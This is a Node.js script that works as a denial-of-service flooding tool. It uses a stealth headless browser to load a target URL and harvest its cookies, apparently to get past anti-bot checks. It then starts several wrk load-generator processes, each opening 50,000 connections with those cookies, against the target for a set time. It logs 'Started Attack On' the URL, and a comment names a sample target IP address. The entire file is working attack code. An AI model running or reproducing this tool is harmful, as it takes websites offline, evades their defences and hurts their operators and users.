
var TARGET;
if(process.argv[2] === undefined){
    console.log("Wrong Usage!");
    console.log("Usage: node START.js URL METHOD(GET-POST) THREADS TIME ProxyFile RANDCOOKIE(true - false) Optional(%RAND%):RAND_Length");
    process.exit(3162);
} else {
    TARGET = process.argv[2].replace("\"", "");
    if(TARGET.includes("%RAND%")){
        if(process.argv.length < 8)
        {
            console.log("Wrong Usage!");
            console.log("Usage: node START.js URL METHOD(GET-POST) THREADS TIME ProxyFile RANDCOOKIE(true - false) Optional(%RAND%):RAND_Length");
            process.exit(3162);
        }
    }
}
var executablePath;
const os = require('os');
const osPlatform = os.platform();
if (/^win/i.test(osPlatform)) {
    executablePath = '';
}else if (/^linux/i.test(osPlatform)) {
    executablePath = '/usr/bin/chromium';
}
var COOKIES;
const {spawn} = require('child_process')
const chalk = require("chalk");
const EventEmitter = require('events');
const puppeteer = require('puppeteer-extra')
var BROWSER;
var INDEX_RAND;
if(TARGET.includes("%RAND%")){RAND = 1; BROWSER = TARGET.replace("%RAND%", ""); INDEX_RAND = TARGET.indexOf("%RAND%");}else{BROWSER = TARGET}
var THREADS = process.argv[3];
var TIME = process.argv[4];
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;
process.on('uncaughtException', function (err) { console.log(err) });
process.on('unhandledRejection', function (err) { console.log(err) });

async function GetCookies(){
    String.prototype.replaceBetween = function(start, end, what) {
        return this.substring(0, start) + what + this.substring(end);
    };
    console.log(chalk.yellow(`Started Attack On ${TARGET} For ${TIME} Second`))

    const StealthPlugin = require('puppeteer-extra-plugin-stealth')
    puppeteer.use(StealthPlugin())
    puppeteer.launch({ headless: true ,
    product: 'chrome',
 	executablePath: executablePath, args: [
        '--no-sandbox',
       '--disable-gpu',
        '--disable-canvas-aa', 
       '--disable-2d-canvas-clip-aa', 
        '--disable-gl-drawing-for-tests', 
        '--disable-dev-shm-usage', 
        '--no-zygote', 
        '--use-gl=swiftshader', 
        '--enable-webgl',
        '--hide-scrollbars',
        '--mute-audio',
        '--no-first-run',
        '--disable-infobars',
        '--disable-breakpad',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
]}).then(async browser => {
        console.log(chalk.red("Browsing The WebSite...."));
		const page = await browser.newPage();
		await page.setDefaultNavigationTimeout(6000, (err, res) => {});

//});
        await page.goto(BROWSER)
        await page.waitForTimeout(8000)
        //await page.screenshot({ path: 'testresult.png', fullPage: true })
        await page.goto(BROWSER)
        //await page.screenshot({ path: 'testresult2.png', fullPage: true })
        COOKIES = await page.cookies()
        await browser.close()
        //console.log(COOKIES)
        for (i=0, len=COOKIES.length, F_COOKIES=""; i<len; i++){
            F_COOKIES += COOKIES[i]['name'] + ": " + COOKIES[i]['value'] + "; "
        }
        COOKIES = `\"${F_COOKIES}\"`
        console.log(COOKIES)
        for (i=0; i<THREADS; i++){
            console.log(`Thread ${i+1} Started!`)
            //./wrk -c 55000 -d 30 -t 10 http://88.198.16.90/

            let spawned = spawn("./wrk", [ "-c", '50000', '-d', TIME, '-t', '3', TARGET, '-H', 'Cookie: ' + COOKIES, TARGET]);
            spawned.stdout.on('data', (data) => {
                console.log(`stdout: ${data}`);
            });
            
            spawned.stderr.on('data', (data) => {
                console.error(`stderr: ${data}`);
            });
        }
    });
}

GetCookies();
